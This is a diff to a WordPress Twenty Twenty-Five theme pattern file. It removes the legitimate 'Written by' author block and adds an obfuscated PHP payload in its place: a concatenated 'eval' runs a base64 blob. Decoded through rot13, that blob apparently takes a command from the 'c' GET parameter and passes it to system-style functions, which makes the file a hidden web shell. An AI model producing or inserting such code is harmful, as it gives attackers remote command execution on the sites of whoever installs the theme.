@@ -1,34 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Written by
- * Slug: twentytwentyfive/hidden-written-by
- * Inserter: no
- *
- * @package    WordPress
- * @subpackage Twenty_Twenty_Five
- * @since      Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IEpldmdncmEgb2wKICogRnlodDogZ2pyYWdsZ2pyYWdsc3Zpci91dnFxcmEtamV2Z2dyYS1vbAogKiBWYWZyZWdyZTogYWIKICoKICogQGNucHhudHIgICAgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgICAgICBHanJhZ2wgR2pyYWdsLVN2aXIgMS4wCiAqLwoKPz4KPCEtLSBqYzp0ZWJoYyB7XCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJveWJweFRuY1wiOlwiMC4ycnpcIixcInpuZXR2YVwiOntcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDYwXCJ9fX0sXCJncmtnUGJ5YmVcIjpcIm5wcHJhZy00XCIsXCJzYmFnRnZtclwiOlwiZnpueXlcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInN5cmtcIixcInN5cmtKZW5jXCI6XCJqZW5jXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIHVuZi1ucHByYWctNC1wYnliZSB1bmYtZ3JrZy1wYnliZSB1bmYteXZheC1wYnliZSB1bmYtZnpueXktc2JhZy1mdm1yXCIgZmdseXI9XCJ6bmV0dmEtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTYwKVwiPgoJPCEtLSBqYzpjbmVudGVuY3UgLS0+Cgk8Yz48P2N1YyByZnBfdWd6eV9yKCAnSmV2Z2dyYSBvbCAnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L2M+Cgk8IS0tIC9qYzpjbmVudGVuY3UgLS0+Cgk8IS0tIGpjOmNiZmctbmhndWJlLWFuenIge1widmZZdmF4XCI6Z2Vocn0gLy0tPgoJPCEtLSBqYzpjbmVudGVuY3UgLS0+Cgk8Yz48P2N1YyByZnBfdWd6eV9yKCAndmEnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L2M+Cgk8IS0tIC9qYzpjbmVudGVuY3UgLS0+Cgk8IS0tIGpjOmNiZmctZ3JlemYge1wiZ3JlelwiOlwicG5ncnRiZWxcIixcImZnbHlyXCI6e1wiZ2xjYnRlbmN1bFwiOntcInNiYWdKcnZ0dWdcIjpcIjMwMFwifX19IC8tLT4KPC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:group {"style":{"spacing":{"blockGap":"0.2em","margin":{"bottom":"var:preset|spacing|60"}}},"textColor":"accent-4","fontSize":"small","layout":{"type":"flex","flexWrap":"wrap"}} -->
-<div class="wp-block-group has-accent-4-color has-text-color has-link-color has-small-font-size" style="margin-bottom:var(--wp--preset--spacing--60)">
-	<!-- wp:paragraph -->
-	<p><?php esc_html_e( 'Written by ', 'twentytwentyfive' ); ?></p>
-	<!-- /wp:paragraph -->
-	<!-- wp:post-author-name {"isLink":true} /-->
-	<!-- wp:paragraph -->
-	<p><?php esc_html_e( 'in', 'twentytwentyfive' ); ?></p>
-	<!-- /wp:paragraph -->
-	<!-- wp:post-terms {"term":"category","style":{"typography":{"fontWeight":"300"}}} /-->
-</div>
-<!-- /wp:group -->
